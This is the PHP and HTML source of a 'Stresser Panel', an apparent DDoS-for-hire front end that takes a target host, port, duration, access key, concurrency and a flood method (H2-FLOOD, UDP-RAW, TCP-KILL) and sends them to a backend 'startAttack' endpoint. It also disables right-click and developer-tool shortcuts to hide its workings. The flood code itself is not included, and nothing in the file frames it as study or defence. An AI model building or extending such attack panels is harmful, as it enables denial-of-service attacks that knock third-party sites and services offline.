<?php
// Security headers
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header("Content-Security-Policy: default-src 'self'; script-src 'self';");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Stresser Panel</title>
    <style>
        body {
            background-color: #0d1117;
            color: #c9d1d9;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            user-select: none;
        }
        .container {
            background-color: #161b22;
            padding: 30px;
            border-radius: 10px;
            width: 400px;
            box-shadow: 0 0 15px rgba(0,0,0,0.5);
        }
        h1 {
            text-align: center;
            color: #00bfff;
        }
        input, select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background-color: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #00bfff;
            border: none;
            color: white;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0080ff;
        }
        .attack-info {
            margin-top: 20px;
            background-color: #0d1117;
            padding: 15px;
            border: 1px solid #30363d;
            border-radius: 5px;
            font-size: 14px;
        }
    </style>
    <script>
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode == 123 || // F12
                (e.ctrlKey && e.shiftKey && ['I','C','J'].includes(e.key.toUpperCase())) ||
                (e.ctrlKey && e.key.toUpperCase() === 'U')) return false;
        };

        function startAttack() {
            const data = {
                host: document.getElementById('host').value,
                port: document.getElementById('port').value,
                time: document.getElementById('time').value,
                method: document.getElementById('method').value,
                key: document.getElementById('key').value,
                concurrents: document.getElementById('concurrents').value
            };

            fetch('hub.php?action=startAttack', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(r => r.json()).then(response => {
                document.getElementById('attackInfo').innerHTML = response.message;
            }).catch(() => {
                document.getElementById('attackInfo').innerHTML = "Error sending attack.";
            });
        }
    </script>
</head>
<body>
<div class="container">
    <h1>Stresser Panel</h1>
    <input type="text" id="host" placeholder="example.com">
    <input type="number" id="port" placeholder="443">
    <input type="number" id="time" placeholder="30s">
    <input type="text" id="key" placeholder="kavernxyz">
    <input type="number" id="concurrents" placeholder="2">
    <select id="method">
        <option value="H2-FLOOD">H2-FLOOD</option>
        <option value="UDP-RAW">UDP-RAW</option>
        <option value="TCP-KILL">TCP-KILL</option>
    </select>
    <button onclick="startAttack()">Confirm</button>
    <div class="attack-info" id="attackInfo"></div>
</div>
</body>
</html>
